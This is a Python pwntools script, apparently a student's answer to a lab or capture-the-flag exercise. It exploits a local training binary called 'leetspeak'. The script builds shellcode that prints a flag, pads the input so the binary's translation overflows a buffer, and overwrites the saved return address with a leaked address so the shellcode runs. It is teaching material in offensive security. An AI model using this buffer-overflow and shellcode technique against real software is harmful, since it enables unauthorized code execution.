#!/usr/bin/env python3

from pwn import * 

# assembly code to print the flag -- do not change this  
# use this as part of your attack
def create_code(addr): 
    copy_addr_asm  = asm('mov rsi,' + hex(addr))
    print_flag_asm = asm(
        '''
        xor rax, rax ; 
        inc rax ; 
        xor rdi, rdi ;
        inc rdi ; 
        xor rdx, rdx ;
        add rdx, 29 ; 
        syscall ; 
        xor rax, rax ;
        add rax, 60 ; 
        xor rdi, rdi ;
        syscall
        ''')
        
    #syscall (write) rax = 0x1, rdi = 0x1, rsi = addr, rdx = 29
    #syscall (exit)  rax = 60
    return copy_addr_asm + print_flag_asm

# TODO: Put your exploit code in the function create_payload below.
def create_payload(addr1, addr2):
    
    # addr1 and addr2 are addresses leaked by the binary. You may need these
    # to create your attack payload.
    
    #addr1 = output_buffer addr
    #addr2 = input_buffer addr
     
    # Stack content after main is called:
    #       MAIN CALLED
    #   0 pre main return address                   (8 bytes)
    #   1 previous frame pointer                    (8 bytes)
    #   2 output_buffer             (rbp - 0x100)   (256 bytes)
    #   3 input_buffer              (rbp - 0x200)   (256 bytes)
    #   4 prev_edi - argc           (rbp - 0x204)   (4 bytes)
    #   5 prev_rsi - argv           (rbp - 0x210)   (8 bytes) 
    #     TRANSLATE CALLED  

    #input buffer size
    length_of_buffer = 0x100
    
    # Create code to print the string at address 0x404050, and then exit gracefully
    content = create_code(0x404050)    
    
    #fill the input buffer with enough characters to fill the output buffer after its translated
    #content will contain create_code + "*" + STRING + "*"
    #where STRING is a combination of h, d, and a such that when they're expanded by translate
    #content's size will be 256 bytes long
    i = length_of_buffer - len(content) - 2
    
    content += b'*'

    while i > 0:
        if i >= 3:
            content += b'h'
            i -= 3
        elif i == 2:
            content += b'd'
            i -= 2
        elif i == 1:
            content += b'a'
            i -= 1
            
    content += b'*'
    
    #overwrite the previous frame pointer (irrelevant - just done so we can overwrite the return address)
    content += p64(0xdeadbeef)
   
    #point the return address to the input buffer so the code generated by create_code is run
    #content += (addr2).to_bytes(8, byteorder="little")
    content += p64(addr2)
    
    #fill the input buffer to stop the python script from stalling
    content += b'A' * (length_of_buffer - len(content))
    
    return content 

# DO NOT MODIFY THE CODE BELOW
def main():
    context.arch = 'amd64'

    # launch program
    p=process('./leetspeak')
    
    # Get the first two lines of output, containing info leak 
    s1 = p.recvline()
    print(s1.decode('utf-8'))
    addr1 = int(s1,16)   
    s2 = p.recvline()
    print(s2.decode('utf-8'))
    addr2 = int(s2,16)

    # create a payload, with the help of the info leak
    payload = create_payload(addr1, addr2)
    # send payload 
    print(p.recvuntil(b': ').decode('utf-8'))
    p.send(payload)
    # retrieve the final result
    print(p.recvall().decode('utf-8','ignore'))

if __name__ == '__main__':
    main()